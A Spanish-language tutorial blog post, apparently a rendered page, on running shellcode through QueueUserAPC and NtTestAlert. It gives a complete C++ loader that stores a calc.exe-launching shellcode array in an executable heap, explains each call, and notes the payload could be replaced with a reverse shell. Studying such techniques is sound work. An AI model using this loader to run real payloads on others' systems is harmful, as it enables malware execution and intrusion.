@@ -1,0 +1,121 @@
+I"�1<p>Esta vez vamos a almacenar la shellcode en el heap de un proceso local usando HeapCrate y HeapAlloc y la ejecutaremos con QueueUserAPC y la NTAPI indocumentada NtTestAlert</p>
+
+<h2 id="asynchronous-procedure-calls-apc-y-queueuserapc">Asynchronous Procedure Calls (APC) y QueueUserAPC()</h2>
+
+<p>De acuerdo a la MSDN, una APC es:</p>
+
+<blockquote>
+  <p>Es una función que se ejecuta de forma asíncrona en el contexto de un subproceso en particular</p>
+</blockquote>
+
+<p>Cada subproceso tiene un propia cola APC, y un subproceso debe estar en un estado de alerta para ejecutar un APC en modo de usuario, algunas formas de indicarle a un subproceso que este en modo de alerta es con las funciones <strong>SleepEx</strong> , <strong>SignalObjectAndWait</strong>, <strong>MsgWaitForMultipleObjectsEx</strong>, etc.</p>
+
+<p>La forma en la que podemos agregar una APC a la cola APC es usando <strong>QueueUserAPC</strong>, la estructura de QueueUserAPC es:</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">QueueUserAPC</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">PAPCFUNC</span>  <span class="n">pfnAPC</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">ULONG_PTR</span> <span class="n">dwData</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>pfnAPC</strong> es un puntero a la APC que se llamara cuando el subproceso realiza una operacion de alerta</li>
+  <li><strong>hThread</strong> es el identificador del hilo</li>
+  <li><strong>dwData</strong> es un valor que funciona como un parametro a <strong>pfnAPC</strong></li>
+</ul>
+
+<h2 id="flujo-de-ejecucion">Flujo de ejecucion</h2>
+
+<ul>
+  <li>Crear un heap usando <strong>HeapCreate</strong></li>
+  <li>Se asigna un bloque de memoria con <strong>HeapAlloc</strong> del tamaño de la shellcode en el heap creado con <strong>HeapCreate</strong></li>
+  <li>Se escribe la shellcode en el bloque de memoria del heap usando <strong>WriteProcessMemory</strong></li>
+  <li>Se encola una APC en el subproceso actual usando <strong>QueueUserAPC</strong></li>
+  <li>Se llama <strong>NtTestAlert</strong> para forzar la ejecucion de la APC</li>
+</ul>
+
+<h3 id="codigo">Codigo</h3>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
+</span>
+<span class="cp">#pragma comment(lib, "ntdll")
+</span><span class="k">using</span> <span class="n">myNtTestAlert</span> <span class="o">=</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span><span class="p">)();</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="n">myNtTestAlert</span> <span class="n">testAlert</span> <span class="o">=</span> <span class="p">(</span><span class="n">myNtTestAlert</span><span class="p">)(</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll"</span><span class="p">),</span> <span class="s">"NtTestAlert"</span><span class="p">));</span>
+    <span class="n">HANDLE</span> <span class="n">hHeap</span> <span class="o">=</span> <span class="n">HeapCreate</span><span class="p">(</span><span class="n">HEAP_CREATE_ENABLE_EXECUTE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">LPVOID</span> <span class="n">shellcodeHeap</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="n">shellcodeHeap</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">PTHREAD_START_ROUTINE</span> <span class="n">apcRoutine</span> <span class="o">=</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcodeHeap</span><span class="p">;</span>
+    <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">apcRoutine</span><span class="p">,</span> <span class="n">GetCurrentThread</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">testAlert</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Pimero creamos un heap en donde le indicamos que en las opciones de asignacion tenga <strong>HEAP_CREATE_ENABLE_EXECUTE</strong> para que los bloques de memoria que se asignen permitan ejecutar codigo</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HeapCreate</span><span class="p">(</span><span class="n">HEAP_CREATE_ENABLE_EXECUTE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Despues asignamos un bloque de memoria donde le indicamos con <strong>HEAP_ZERO_MEMORY</strong> que la asignacion inicie con cero, y el tamaño de la asignacion sea el tamaño de la shellcode, por eso se usa <strong>sizeof(shellcode)</strong></p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>Despues escribimos la shellcode en el bloque de memoria del heap, se usa <strong>GetCurrentProcess()</strong> para que el identificador del proceso sea el identificador del proceso actual, el tamaño en bytes que se van a escribir es igual al tamaño de la shellcode, por eso se vuelve a usar <strong>sizeof(shellcode)</strong></p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="n">shellcodeHeap</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Despues declaramos <strong>apcRoutine</strong> como un puntero <strong>PTHREAD_START_ROUTINE</strong> el cual se le asignara la direccion de memoria que tiene <strong>shellcodeHeap</strong>, con esto le indicariamos que la APC apunte a <strong>shellcodeHeap</strong> que es el bloque del heap que contiene la shellcode</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PTHREAD_START_ROUTINE</span> <span class="n">apcRoutine</span> <span class="o">=</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcodeHeap</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Despues encolamos una APC a la cola APC, se le pasa <strong>(PAPCFUNC)apcRoutine</strong> para que <strong>apcRoutine</strong> sea interpretado como un puntero de tipo <strong>PAPCFUNC</strong> y sea una APC valida, tambien usamos <strong>GetCurrentThread()</strong> para que se use el identificador del hilo actual</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">apcRoutine</span><span class="p">,</span> <span class="n">GetCurrentThread</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Y por ultimo mandamos a llamar a <strong>testAlert()</strong> para forzar la ejecucion de las APC encoladas en el hilo actual.</p>
+
+<p>Si compilamos y ejecutamos se ejecutara la shellcode que la cual abrira la calculadora (evidetemente puedes cambiar la shellcode para que haga otra cosa, una reverse shell por ejemplo)</p>
+
+<p><img src="/assets/img/heap-queue/ejecucion.gif" alt="" /></p>
+
+<h3 id="referencias">Referencias</h3>
+
+<p><a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls</a></p>
+
+<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc</a></p>
+
+<p><a href="https://www.g0dmode.biz/remote-process-injection/queueuserapc-+-nttestalert">https://www.g0dmode.biz/remote-process-injection/queueuserapc-+-nttestalert</a></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
